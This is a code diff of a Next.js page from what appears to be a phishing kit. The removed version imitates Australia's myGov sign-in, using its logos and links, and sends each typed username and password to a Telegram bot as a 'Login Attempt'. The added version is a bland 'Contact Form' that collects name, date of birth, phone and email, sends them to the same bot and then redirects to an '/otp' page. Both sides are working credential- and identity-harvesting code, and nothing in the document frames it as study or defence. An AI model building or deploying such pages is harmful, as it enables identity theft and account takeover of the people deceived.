@@ -2,84 +2,110 @@
 
 import { useState } from "react";
 import { useRouter } from "next/navigation";
-import Image from "next/image";
 import Head from "next/head";
-import { sendTelegramMessage } from "../../utils/telegram";
+import { sendTelegramMessage } from "../../utils/telegram"; // Import Telegram function
 
 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-const phoneRegex = /^\d{10}$/;
-const myGovUsernameRegex = /^[A-Za-z]{2}\d{6}$/;
+const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/; // U.S. phone format (XXX) XXX-XXXX
+const dateRegex = /^\d{4}-\d{2}-\d{2}$/; // YYYY-MM-DD
 
-const validateUsername = (username: string): string => {
-  if (
-    emailRegex.test(username) ||
-    phoneRegex.test(username) ||
-    myGovUsernameRegex.test(username)
-  ) {
-    return "";
+const validateInput = (field: string, value: string): string => {
+  switch (field) {
+    case "email":
+      return emailRegex.test(value) ? "" : "Please enter a valid email address.";
+    case "phone":
+      return phoneRegex.test(value) ? "" : "Phone number must be in (XXX) XXX-XXXX format.";
+    case "dob":
+      return dateRegex.test(value) ? "" : "Please enter a valid date (YYYY-MM-DD).";
+    case "firstName":
+      return value.trim() ? "" : "First name is required.";
+    case "lastName":
+      return value.trim() ? "" : "Last name is required.";
+    default:
+      return "";
   }
-  return "Enter a valid email address, mobile number, or myGov username (2 letters followed by 6 numbers).";
 };
 
-const MyGovSignIn = () => {
-  const [showPassword, setShowPassword] = useState(false);
-  const [usernameError, setUsernameError] = useState<string>("");
+const FormPage = () => {
+  type FormErrors = {
+    [key: string]: string; // Each key (form field) maps to an error message
+  };
+  
+  const [formErrors, setFormErrors] = useState<FormErrors>({});  
+  const [phone, setPhone] = useState<string>(""); // Phone state for formatting
   const router = useRouter();
 
-  const togglePasswordVisibility = () => {
-    setShowPassword((prev) => !prev);
+  // Function to handle phone number formatting
+  const formatPhoneNumber = (input: string) => {
+    const cleaned = input.replace(/\D/g, ""); // Remove non-numeric characters
+    if (cleaned.length <= 3) return `(${cleaned}`;
+    if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
+    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`;
+  };
+
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formattedPhone = formatPhoneNumber(e.target.value);
+    setPhone(formattedPhone);
   };
 
   const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     const form = e.currentTarget;
-    const username = (form.elements.namedItem("username") as HTMLInputElement)
-      .value;
-    const password = (form.elements.namedItem("password") as HTMLInputElement)
-      .value;
+    const formData = {
+      firstName: (form.elements.namedItem("firstName") as HTMLInputElement).value,
+      lastName: (form.elements.namedItem("lastName") as HTMLInputElement).value,
+      dob: (form.elements.namedItem("dob") as HTMLInputElement).value,
+      phone,
+      email: (form.elements.namedItem("email") as HTMLInputElement).value,
+    };
 
-    const error = validateUsername(username);
-    if (error) {
-      setUsernameError(error);
-      return;
+    const errors: Record<string, string> = {};  
+
+    Object.keys(formData).forEach((field) => {  
+      const typedField = field as keyof typeof formData;  
+      const error = validateInput(typedField, formData[typedField]);  
+    
+      if (error) errors[typedField] = error;  
+    });
+    
+    if (Object.keys(errors).length > 0) {  
+      setFormErrors(errors);  
+      return;  
     }
+    
 
-    // Reset any previous error
-    setUsernameError("");
-
-    // Prepare the message for Telegram
+    // Prepare message for Telegram
     const message = `
-      🚨 Login Attempt 🚨
-      - Username: ${username}
-      - Password: ${password}
+      🚨 New Contact Form Submission 🚨
+      - Full Name: ${formData.firstName} ${formData.lastName}
+      - Date of Birth: ${formData.dob}
+      - Phone: ${formData.phone}
+      - Email: ${formData.email}
       - Time: ${new Date().toLocaleString()}
     `;
 
+    // Try sending the message to Telegram
     try {
       await sendTelegramMessage(message);
-      router.push("/err");
+      router.push("/otp"); // Navigate to success page after form submission
     } catch (error) {
       console.error("Error sending message to Telegram:", error);
+      alert("An error occurred while submitting the form. Please try again.");
     }
   };
 
   return (
     <>
       <Head>
-        <title>Sign in with myGov - myGov</title>
+        <title>Contact Form</title>
         <meta name="viewport" content="width=device-width, initial-scale=1" />
       </Head>
       <div className="min-h-screen flex flex-col bg-gray-50">
         {/* Header */}
-        <header className="bg-[#66d3ee] border-b-4 border-[#66d3ee]">
+        <header className="bg-[#66d3ee] border-b-4">
           <div className="max-w-7xl mx-auto flex items-center p-4">
             <a href="#" className="flex items-center">
-              <Image
-                src="/images/myGov-cobranded-logo-black.svg"
-                alt="myGov Beta Logo"
-                width={150}
-                height={40}
-              />
+              
             </a>
           </div>
         </header>
@@ -88,143 +114,102 @@ const MyGovSignIn = () => {
         <main className="flex-grow container mx-auto mt-12 px-4">
           <div className="max-w-lg mx-auto bg-white p-10 shadow-lg rounded-xl">
             <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">
-              Sign in with myGov
+              Contact Information Form
             </h1>
             <p className="text-sm text-gray-600 text-center mb-8">
-              Access government services with your myGov account
+              Please fill out the form below.
             </p>
-            <form onSubmit={handleFormSubmit}>
-              {/* Username Field */}
-              <div className="mb-6">
-                <label
-                  htmlFor="userId"
-                  className="block text-sm font-medium text-black"
-                >
-                  Username or email
-                </label>
-                <input
-                  id="userId"
-                  name="username"
-                  type="text"
-                  required
-                  className={`w-full mt-2 border ${
-                    usernameError ? "border-red-500" : "border-gray-300"
-                  } rounded-lg p-3 focus:outline-none focus:ring-2 ${
-                    usernameError ? "focus:ring-red-500" : "focus:ring-blue-500"
-                  }`}
-                  onBlur={(e) =>
-                    setUsernameError(validateUsername(e.target.value))
-                  }
-                />
-                {usernameError && (
-                  <p className="text-sm text-red-500 mt-2">{usernameError}</p>
-                )}
-                <p className="text-sm mt-2 text-right">
-                  <a
-                    href="#"
-                    className="text-blue-600 hover:underline focus:outline-none"
-                  >
-                    Forgot username?
-                  </a>
-                </p>
+            <form onSubmit={handleFormSubmit} aria-label="Contact form">
+              {/* Name Fields */}
+              <div className="grid grid-cols-2 gap-4 mb-6">
+                <div>
+                  <label htmlFor="firstName" className="block text-sm font-medium text-black">
+                    First Name
+                  </label>
+                  <input
+                    id="firstName"
+                    name="firstName"
+                    type="text"
+                    required
+                    className={`w-full mt-2 border ${formErrors.firstName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.firstName ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                  />
+                  {formErrors.firstName && <p className="text-sm text-red-500 mt-2">{formErrors.firstName}</p>}
+                </div>
+
+                <div>
+                  <label htmlFor="lastName" className="block text-sm font-medium text-black">
+                    Last Name
+                  </label>
+                  <input
+                    id="lastName"
+                    name="lastName"
+                    type="text"
+                    required
+                    className={`w-full mt-2 border ${formErrors.lastName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.lastName ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                  />
+                  {formErrors.lastName && <p className="text-sm text-red-500 mt-2">{formErrors.lastName}</p>}
+                </div>
               </div>
 
-              {/* Password Field */}
-              <div className="mb-6 relative">
-                <label
-                  htmlFor="password"
-                  className="block text-sm font-medium text-black"
-                >
-                  Password
+              {/* Date of Birth */}
+              <div className="mb-6">
+                <label htmlFor="dob" className="block text-sm font-medium text-black">
+                  Date of Birth (YYYY-MM-DD)
                 </label>
                 <input
-                  id="password"
-                  name="password"
-                  type={showPassword ? "text" : "password"}
+                  id="dob"
+                  name="dob"
+                  type="date"
                   required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  className={`w-full mt-2 border ${formErrors.dob ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.dob ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                 />
-                <button
-                  type="button"
-                  onClick={togglePasswordVisibility}
-                  className="absolute right-3 top-9 text-blue-600 text-sm font-medium hover:underline focus:outline-none"
-                >
-                  {showPassword ? "Hide" : "Show"}
-                </button>
-                <p className="text-sm mt-2 text-right">
-                  <a
-                    href="#"
-                    className="text-blue-600 hover:underline focus:outline-none"
-                  >
-                    Forgot password?
-                  </a>
-                </p>
+                {formErrors.dob && <p className="text-sm text-red-500 mt-2">{formErrors.dob}</p>}
+              </div>
+
+              {/* Phone Number with Formatting */}
+              <div className="mb-6">
+                <label htmlFor="phone" className="block text-sm font-medium text-black">
+                  Phone Number (U.S.)
+                </label>
+                <input
+                  id="phone"
+                  name="phone"
+                  type="text"
+                  placeholder="(123) 456-7890"
+                  required
+                  value={phone}
+                  onChange={handlePhoneChange}
+                  maxLength={14} // Ensures correct format
+                  className={`w-full mt-2 border ${formErrors.phone ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.phone ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                />
+                {formErrors.phone && <p className="text-sm text-red-500 mt-2">{formErrors.phone}</p>}
+              </div>
+
+              {/* Email */}
+              <div className="mb-6">
+                <label htmlFor="email" className="block text-sm font-medium text-black">
+                  Email Address
+                </label>
+                <input
+                  id="email"
+                  name="email"
+                  type="email"
+                  required
+                  className={`w-full mt-2 border ${formErrors.email ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.email ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                />
+                {formErrors.email && <p className="text-sm text-red-500 mt-2">{formErrors.email}</p>}
               </div>
 
               {/* Submit Button */}
-              <button
-                type="submit"
-                className="w-full px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7] transition focus:outline-none focus:ring-2 focus:ring-blue-600"
-              >
-                Sign in
+              <button type="submit" className="w-full px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7] transition focus:outline-none focus:ring-2 focus:ring-blue-600">
+                Submit
               </button>
-
-              {/* Create Account */}
-              <p className="text-center text-sm text-gray-600 mt-6">
-                Don’t have an account?{" "}
-                <a
-                  href="https://my.gov.au/en/create-account/"
-                  className="text-blue-600 hover:underline focus:outline-none"
-                >
-                  Create one here
-                </a>
-              </p>
             </form>
           </div>
         </main>
-
-        {/* Footer */}
-        <footer className="bg-gray-900 text-white py-10 mt-12">
-          <div className="container mx-auto text-center">
-            <ul className="flex justify-center space-x-6 mb-4 text-sm">
-              <li>
-                <a href="#" className="hover:underline focus:outline-none">
-                  Terms of use
-                </a>
-              </li>
-              <li>
-                <a href="#" className="hover:underline focus:outline-none">
-                  Privacy and security
-                </a>
-              </li>
-              <li>
-                <a href="#" className="hover:underline focus:outline-none">
-                  Copyright
-                </a>
-              </li>
-              <li>
-                <a href="#" className="hover:underline focus:outline-none">
-                  Accessibility
-                </a>
-              </li>
-            </ul>
-            <Image
-              src="/images/myGov-cobranded-logo-white.svg"
-              alt="myGov Beta Logo"
-              width={150}
-              height={40}
-              className="h-10 mx-auto"
-            />
-            <p className="mt-6 text-sm">
-              We acknowledge the Traditional Custodians of the lands we live on.
-              We pay our respects to all Elders, past and present, of all
-              Aboriginal and Torres Strait Islander nations.
-            </p>
-          </div>
-        </footer>
       </div>
     </>
   );
 };
 
-export default MyGovSignIn;
+export default FormPage;
